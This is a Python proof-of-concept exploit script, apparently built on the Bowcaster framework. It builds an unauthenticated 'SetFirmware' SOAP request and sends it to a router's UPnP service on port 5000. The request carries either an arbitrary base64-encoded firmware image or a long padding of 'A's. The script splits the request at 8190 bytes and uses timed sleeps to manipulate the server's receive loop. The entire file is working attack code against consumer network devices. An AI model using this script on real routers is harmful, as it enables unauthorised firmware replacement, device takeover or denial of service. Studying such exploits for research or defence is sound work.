#!/usr/bin/env python

# Copyright (c) 2015
# - Zachary Cutlip <uid000()gmail.com>
# 
# See LICENSE for more details.
# 

import sys
import socket
import time
import base64
from bowcaster.common import Logging


HOST="10.12.34.1"
#HOST="192.168.127.141"


class SetFirmwareRequest(object):
    """
    Generate a "SetFirmware" SOAP request
    
    Params
    ------
    firmware_file:  Optional. The name of a file to base64 encode into
                    the SOAP request. If no file is provided, a string
                    of As is used (unencoded) in its place.
    logger:         Optional. A Bowcaster Logging object. If a logger
                    is not provided, one will be instantiated.
    """
    MIN_CONTENT_LENGTH=102401
    def __init__(self,firmware_file=None,logger=None):
        b64encode=True
        if not logger:
            logger=Logging(max_level=Logging.DEBUG)
        if firmware_file:
            logger.LOG_INFO("Reading firmware data from: %s" % firmware_file)
            firmware_data=open(firmware_file,"rb").read()
        else:
            b64encode=False
            logger.LOG_INFO("Generating padding of As in place of firmware data.")
            firmware_data="A"*self.MIN_CONTENT_LENGTH
        self.request_body=SetFirmwareBody(firmware_data,b64encode=b64encode,logger=logger)
        content_length=len(self.request_body)
        self.request_headers=SetFirmwareRequestHeaders(content_length)
    
    def __str__(self):
        return str(self.request_headers)+str(self.request_body)

class SetFirmwareRequestHeaders(object):
    """
    Class to generate the HTTP headers for a "SetFirmware" SOAP request.
    
    Params
    ------
    content_length: Value to specify for the Content-Length header.
    """
    def __init__(self,content_length):
        headers="".join(["POST /soap/server_sa/SetFirmware HTTP/1.1\r\n",
                             "Accept-Encoding: identity\r\n",
                             "Content-Length: %d\r\n",
                             "Soapaction: \"urn:DeviceConfig\"\r\n",
                             "Host: 127.0.0.1\r\n",
                             "User-Agent: Python-urllib/2.7\r\n",
                             "Connection: close\r\n",
                             "Content-Type: text/xml ;charset=\"utf-8\"\r\n\r\n"])
         
        self.headers=headers % (content_length)
        
    def __str__(self):
        return self.headers


class SetFirmwareBody(object):
    """
    Class to generate the body of a "SetFirmware" SOAP request
    
    Params
    ------
    firmware_data:  Data to encapsulate in the request.
    b64encode:      Optional. Boolean flag whether to base64 encode firmware_data.
    logger:         Optional. A Bowcaster Logging object. If a logger
                    is not provided, one will be instantiated.
    """
    SOAP_REQUEST_START="<SOAP-ENV:Body><NewFirmware>"
    SOAP_REQUEST_END="</NewFirmware></SOAP-ENV:Body>"
    def __init__(self,firmware_data,b64encode=True,logger=None):
        if not logger:
            logger=Logging(max_level=Logging.DEBUG)
        self.logger=logger
        logger.LOG_DEBUG("Building SetFirmware request body.")
        logger.LOG_DEBUG("Length of firmware: %d" % len(firmware_data))
        if b64encode:
            self.encoded_firmware=base64.b64encode(firmware_data)
        else:
            self.encoded_firmware=firmware_data
        
        logger.LOG_DEBUG("Length of encoded firmware: %d" % len(self.encoded_firmware))
    
    def __len__(self):
        return len(self.SOAP_REQUEST_START+self.encoded_firmware+self.SOAP_REQUEST_END)
    
    def __str__(self):
        return self.SOAP_REQUEST_START+self.encoded_firmware+self.SOAP_REQUEST_END

def special_upnp_send(addr,port,data):
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((addr,port))
    
    """only send first 8190 bytes of request"""
    sock.send(data[:8190]) 
    
    """sleep to ensure first recv()
    only gets this first chunk."""
    time.sleep(1)
    
    """Hopefully in upnp_receiv_firmware_packets()
    by now, so we can send the rest."""
    sock.send(data[8190:])
    
    """
    Sleep a bit more so server doesn't end up
    in an infinite select() loop.
    Select's timeout is set to 1 sec,
    so we need to give enough time
    for the loop to go back to select,
    and for the timeout to happen,
    returning an error."""
    time.sleep(10)
    sock.close()


def main(firmware_file=None):
    logger=Logging(max_level=Logging.DEBUG)
    request=SetFirmwareRequest(firmware_file=firmware_file,logger=logger)
    
    #write out the request to a file so we can easily analyze what we sent.
    logger.LOG_DEBUG("Writing request to request.bin for analysis.")
    open("./request.bin","wb").write(str(request))
    logger.LOG_DEBUG("Done.")

    logger.LOG_INFO("Sending special UPnP request to host: %s" % HOST)
    special_upnp_send(HOST,5000,str(request))
    logger.LOG_INFO("Done.")

if __name__ == "__main__":
    try:
        
        firmware_file=sys.argv[1]
    except:
        firmware_file=None
    main(firmware_file)

    
